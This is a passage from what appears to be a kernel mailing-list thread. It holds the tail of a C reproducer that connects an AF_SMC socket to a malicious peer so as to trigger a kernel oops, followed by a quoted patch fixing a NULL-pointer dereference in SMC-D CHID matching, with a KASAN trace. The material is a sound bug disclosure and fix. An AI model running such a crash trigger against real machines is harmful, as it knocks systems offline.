+if (s < 0) { perror("socket(AF_SMC)"); return 1; }
+struct sockaddr_in sa =3D { .sin_family =3D AF_INET,
+.sin_port =3D htons(PEER_PORT),
+.sin_addr.s_addr =3D peer_ip };
+fprintf(stderr, "[*] connecting AF_SMC ...\n");
+connect(s, (struct sockaddr *)&sa, sizeof(sa)); /* expect: kernel oops */
+sleep(5);
+return 0;
+}
+```
+
+Feel free to ask any questions to reproduce this issue.
+Thanks,
+Xiang
+
+On Sun, May 10, 2026 at 11:21=E2=80=AFPM Xiang Mei <xmei5@asu.edu> wrote:
+>
+> On the SMC-D client, slot 0 of ini->ism_dev[]/ini->ism_chid[] is
+> reserved for an SMC-Dv1 device. smc_find_ism_v2_device_clnt()
+> populates V2 entries starting at index 1, so when no V1 device is
+> selected slot 0 is left in its kzalloc()'ed state with ism_dev[0] =3D=3D
+> NULL and ism_chid[0] =3D=3D 0.
+>
+> smc_v2_determine_accepted_chid() then matches the peer's CHID against
+> the array starting from index 0 using the CHID alone. A malicious
+> peer replying to a SMC-Dv2-only proposal with d1.chid =3D=3D 0 matches
+> the empty slot, ini->ism_selected becomes 0, and the subsequent
+> ism_dev[0]->lgr_lock dereference in smc_conn_create() faults at
+> offsetof(struct smcd_dev, lgr_lock) =3D=3D 0x68:
+>
+>   BUG: KASAN: null-ptr-deref in _raw_spin_lock_bh+0x79/0xe0
+>   Write of size 4 at addr 0000000000000068 by task exploit/144
+>   Call Trace:
+>    _raw_spin_lock_bh
+>    smc_conn_create (net/smc/smc_core.c:1997)
+>    __smc_connect (net/smc/af_smc.c:1447)
+>    smc_connect (net/smc/af_smc.c:1720)
+>    __sys_connect
+>    __x64_sys_connect
+>    do_syscall_64
+>
+> Require ism_dev[i] to be non-NULL before accepting a CHID match.
+>
+> Fixes: a7c9c5f4af7f ("net/smc: CLC accept / confirm V2")
+> Reported-by: Weiming Shi <bestswngs@gmail.com>
+> Assisted-by: Claude:claude-opus-4-7
+> Signed-off-by: Xiang Mei <xmei5@asu.edu>
+> ---
+>  net/smc/af_smc.c | 3 ++-
+>  1 file changed, 2 insertions(+), 1 deletion(-)
+>
+> diff --git a/net/smc/af_smc.c b/net/smc/af_smc.c
+> index 185dbed7de5d..12ea3b6dbc64 100644
+> --- a/net/smc/af_smc.c
+> +++ b/net/smc/af_smc.c
+> @@ -1400,7 +1400,8 @@ smc_v2_determine_accepted_chid(struct smc_clc_msg_a=
+ccept_confirm *aclc,
+>         int i;
+>
+>         for (i =3D 0; i < ini->ism_offered_cnt + 1; i++) {
+> -               if (ini->ism_chid[i] =3D=3D ntohs(aclc->d1.chid)) {
+> +               if (ini->ism_dev[i] &&
+> +                   ini->ism_chid[i] =3D=3D ntohs(aclc->d1.chid)) {
+>                         ini->ism_selected =3D i;
+>                         return 0;
+>                 }
+> --
+> 2.43.0
+>
 
